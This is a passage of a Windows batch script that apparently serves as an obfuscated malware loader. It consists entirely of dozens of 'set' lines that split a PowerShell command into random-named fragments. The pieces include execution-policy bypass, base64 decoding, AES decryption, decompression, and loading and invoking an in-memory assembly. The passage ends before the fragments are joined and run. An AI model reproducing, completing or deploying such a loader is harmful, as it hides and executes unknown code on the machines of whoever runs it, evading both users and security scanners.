@echo off
set "VovBUEjRPN=tion"
set "SVjwTMUXwo=QhUJ"
set "knAqdjCMdY=vE);"
set "JuPsOjjxdE=();$"
set "UgbTXoGDcs=Fina"
set "OFnjJOEGjn=;$Ue"
set "GmaaDrergZ=, (,"
set "EBlWcPAnrN=oryS"
set "rUKViagPvw=hy.A"
set "vALWXtPMke=[-1."
set "YgkXdcfRVU=UJ);"
set "nrKjkfbvjo=-Obj"
set "HUjkGvwNdL=vE ="
set "pfnMmbCrAS=ss -"
set "mOhILtvQsj=n ''"
set "rtaWeQMjTD=$UVw"
set "gyGkpGvRQd=New-"
set "vhKtVdwMNL=urit"
set "KOdcZRWrwx=J, 0"
set "BnUlvDsnRv=rofi"
set "nDMloPvXIx=grap"
set "KoZUAHNilA=tS46"
set "FdTjRZPhEe=onve"
set "BdmeEBvYGH=.Ass"
set "EAVXjzHOXY=pose"
set "eCeLGVTNxL= if "
set "ScUordtNRq=-4] "
set "HJRQIipYIO=ewLi"
set "wbsziHxmXy=..-1"
set "KXbooyxEuu=stem"
set "vhLkcKaMZk=raph"
set "jHVnORedlW=e]::"
set "mRkxWFoXFv=bypa"
set "XjjmrZbmQD=UGTu"
set "wkHBPYcYGO=esaB"
set "GqWDihkejH== [S"
set "QBSPuUKTzp=ring"
set "nOfKBiFFuu=join"
set "LQLbRfJEOc=ert]"
set "hwGGUPOKqK=Comp"
set "vhVlknycxf=.Mod"
set "BuUeHYITPo=Syst"
set "OQyfHwomAl=raph"
set "LFpHOnnJsw=y.Pa"
set "vYwKLHRJyX=Bmor"
set "LXOLjQZGzg=:: '"
set "xUhmYGqHoZ=Conv"
set "kPMDAydMAu=yste"
set "ngZSthVbqr=null"
set "dSTJjvAzhW=UOTe"
set "bQkDHtGNLD=;$gg"
set "yzTQAIzZYH=$Uek"
set "nevHycctGz=nage"
set "lIGiedqdfS=)) {"
set "swygpOVMCK=xQhU"
set "sgcmfCXmPZ=.Key"
set "aeoWEeqmhF=gth)"
set "kUOQKwgmEw=; };"
set "QbCFrCAebC=1..-"
set "OSrpHPZmQC=ress"
set "SjwAoNirRe=] -j"
set "EndOQVxPHO=in $"
set "HCbsDOZOtV=BC;$"
set "iAcAmxGykK=t Sy"
set "UyRjGkkEaF=::('"
set "SdwigcARoi=ke($"
set "QfmNGbWnTl=[Sys"
set "mnIBKzHjDN=ion."
set "hOUOsISlFt=$xQh"
set "zRIcKgsxgk=Disp"
set "hrOuRpieIq=.Dis"
set "kKsPIYsXJE=oint"
set "tNbXOCilhq=eam("
set "XkiOtGwcgw=v4Ir"
set "TXZRnFOZOH=am;$"
set "qBDatyuVTm=tem."
set "UWrRZdskEs= [Sy"
set "UEUMyWfOZi=pose"
set "vTjINyFXmA=]::C"
set "bUFlusmRgJ=);$g"
set "tFrUDygNxK=vE.T"
set "GOEVoOHOKB=y.Cr"
set "GpOYIbqmpy= New"
set "kSueaBpMOx=736u"
set "DbJFNviYjk=brea"
set "jdhIjytBKn=m.IO"
set "RpJjlTmdXs='[-1"
set "zncObCWElJ=.Cop"
set "MggdDlelHk='dqR"
set "FWLbtwdItk=LHjh"
set "DCFxqxnhYr=yste"
set "muKWqdqetD=Obje"
set "oFPsnBtjZw=COog"
set "fhyPukWPXi=m.IO"
set "eeGqrGoMyA=File"
set "opxpDnWKdp=  $c"
set "tHnptxvffN=.Mem"
set "hxBUYourHx=$EVG"
set "bNcyCVuiLH=tEyF"
set "fjJwTgXRLI=em.C"
set "RixYkmyKbf=kUa "
set "GgzMPFRJCf=rtS4"
set "RLjnTDpPRP=lit("
set "sXAnjlbfNi=H.En"
set "DzPoKNPzqk=3HWs"
set "ziPoBfxyks=g.Pa"
set "lxmdZJnSUr= [Sy"
set "cJRSNlzPGe=.-16"
set "vHIOmoWAoL=vj0m"
set "BJfKkQylHQ=vert"
set "AuIeqwRnXN=k; }"
set "NfCXvqkaZA=em.I"
set "MglWSiOruk=]::("
set "YiLoutZxhX=('%*'"
set "zFfbQyuUeF===')"
set "UZtbDXHpNT=6] -"
